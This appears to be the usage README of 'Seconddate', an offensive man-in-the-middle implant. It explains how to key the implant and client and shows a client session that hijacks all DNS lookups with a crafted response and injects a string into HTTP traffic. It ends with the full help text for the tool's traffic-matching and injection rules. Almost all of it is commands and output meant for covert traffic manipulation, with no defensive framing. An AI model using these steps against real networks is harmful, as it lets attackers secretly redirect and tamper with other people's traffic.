## Seconddate

MITM implant. Allows advanced control and injection of data into network traffic.

e.g. inject into http traffic

#### Usage
```
# keying instructions
Implants and client are pinned with 32byte pub/priv keys.
Use Store.py for com_private and com_public.
Generate two key pairs and embed priv/pub2 to client and priv2/pub to implant.

./client <targetip>:<port>

SD> ping
Thu, 03 Aug 2023 19:18:19 +0000
Automatically synchronizing...
Synchronize success


# Install DNS hijack on all DNS
./create_dns_injection.py -a OFFSET:12,A,0,192.168.1.1 -o response.bin
SD> rule 1 --appdns --matches 0 --interval 0 --injectfile ./response.bin

[SUCCESS]

SD> rule 1 --apphttp --matches 0 --interval 0 --inject IGOTINJECTEDSTRING
SD> enable 1
```

```
# -help menu for client
SD> help rule
Thu, 03 Aug 2023 19:14:55 +0000

Usage: rule <rule number> [ ... options ... ]

Valid options:
    --srcaddr <ip address>          : Default:
                                        any (0.0.0.0 IPv4, :: IPv6)
    --srcmask <mask>                : Description:
                                        Formatted as xxx.xxx.xxx.xxx (IPv4 only)
                                        or CIDR value (IPv4 and IPv6).
                                        Interpretation is based on --srcaddr's
                                        IP version.
                                      Default:
                                        If --srcaddr is:
                                            IPv4: 255.255.255.255 (or 32)
                                            IPv6: 128
                                            Not set: 0.0.0.0 (IPv4) or 0 (IPv6)
    --dstaddr <ip address>          : Default:
                                        any (0.0.0.0 IPv4, :: IPv6)
    --dstmask <mask>                : Description:
                                        Formatted as xxx.xxx.xxx.xxx (IPv4 only)
                                        or CIDR value (IPv4 and IPv6).
                                        Interpretation is based on --dstaddr's
                                        IP version.
                                      Default:
                                        If --dstaddr is:
                                            IPv4: 255.255.255.255 (or 32)
                                            IPv6: 128
                                            Not set: 0.0.0.0 (IPv4) or 0 (IPv6)
    --protocol <integer>            : Default:
                                        6 (TCP)
    --srcport <integer>             : Default:
                                        0 (any)
    --dstport <integer>             : Default:
                                        0 (any)

    --appnone=[string]              : Default:
        or --apphttp                  --appnone
        or --appdns[=string]
        or --appqs[=string]           --appnone Options:
                                        reverse | forward
                                      Default:
                                        reverse

                                      --appdns Options:
                                        a     | axfr | cname | hinfo | maila |
                                        mailb | mb   | md    | mf    | mg    |
                                        minfo | mr   | mx    | ns    | null  |
                                        ptr   | soa  | txt   | wks
                                      Default:
                                        a

                                      --appqs Options:
                                        s | r | sr   (s = shoot, r = respond)
                                      Default:
                                        neither

    --matches <integer>             : Description:
                                        Total number of matches to perform
                                        within the window period. 0
                                        indicates infinite matches.
                                      Default:
                                        5
    --window <integer>              : Description:
                                        Window period duration in seconds. 0
                                        indicates an infinite window.
                                      Default:
                                        0
    --interval <integer>            : Description:
                                        Minimum time between subsequent matches
                                        in seconds.
                                      Default:
                                        60

    --runtime <integer>             : Description:
                                        Maximum length of time to run after
                                        being enabled in seconds. 0 indicates
                                        infinite time.
                                      Default:
                                        0

    --regexfile <path>              : Default:
        or --regex <string>             not set

    --injectfile <path>             : Default:
        or --inject <string>            not set

    --interact-normal               : Description:
        or --interact-normal-block      Control the interaction between
        or --interact-normal-skip       multiple rules. Please reference
        or --interact-ignore            the offline documentation for more
        or --interact-ignore-block      information.
        or --interact-ignore-skip     Default:
                                        --interact-normal

    --tcpflag <string>              : Options:
                                        fin | syn | rst | psh | ack | urg | none
                                      Default:
                                        fin ack psh
                                      Note:
                                        To set multiple flags this option
                                        should be specified multiple times.

    --nolog                         : Default:
                                        not set

    --qskeyfile <path>              : Default:
        or --qskey <32-byte hex>        not set

    --qsmaxpad <integer>            : Default:
                                        128 (lower than 64 is not recommended)

Create or update rule <rule number> with the properties described by
[ ... options ... ].

If an option is not provided the listed defaults will be used.


[SUCCESS]

SD> 
```